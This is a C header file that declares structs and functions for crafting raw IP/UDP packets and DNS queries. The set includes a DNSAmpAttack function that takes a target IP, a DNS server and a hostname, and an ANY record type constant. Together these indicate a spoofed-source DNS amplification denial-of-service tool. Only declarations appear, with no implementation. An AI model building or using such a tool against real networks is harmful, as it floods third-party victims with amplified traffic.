#ifndef DNS_H_INCLUDED
#define DNS_H_INCLUDED

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>     // int types
#include <string.h>
#include <sys/socket.h> // socket
#include <netinet/ip.h> // iphdr
#include <netinet/udp.h>// udphdr
#include <arpa/inet.h>
#include <unistd.h>

#define RECORD_ANY  0x00ff
#define DNS_PORT 53

typedef uint16_t size_type;
typedef struct ip ip_header;
typedef struct udphdr udp_header;

// Checksum utility
uint16_t checkSum(uint16_t * buffer, size_type nbytes);

// Copy hostname into buffer in dns QNAME format
void formatDNSName(char * buffer, const char * hostname);

// Create dns message and return length of said message
size_type createDNSMessage(char * dns_message, const char * hostname, uint16_t record_type);

// Creat ip, udp header
void createIPHeader(ip_header * ip, const char * src_ip, const char * dst_ip, size_type data_len);
void creatUDPHeader(udp_header * udp, int src_port, int dst_port, size_type data_len);

// IPv4 cheksum
void IPv4CheckSum(const ip_header * ip, udp_header * udp);

// DNS Amplification
void DNSAmpAttack(const char * target_ip, int target_port, const char * dns_server_ip, const char * hostname);

typedef struct
{
    uint32_t ip_src;
    uint32_t ip_dst;
    uint8_t  zeroes;
    uint8_t  protocol;
    uint16_t ulen;
} ps_header;

typedef struct
{
    uint16_t id;    // arbitrary id
    uint16_t flags; // flags
    uint16_t qcount;// number of questions
    uint16_t answ;  // number of answers
    uint16_t auth;  // number of authority records
    uint16_t addi;  // number of additional records
} dns_header;

typedef struct
{
    uint16_t qtype; // question type
    uint16_t qclass;// question class
} question;

#endif
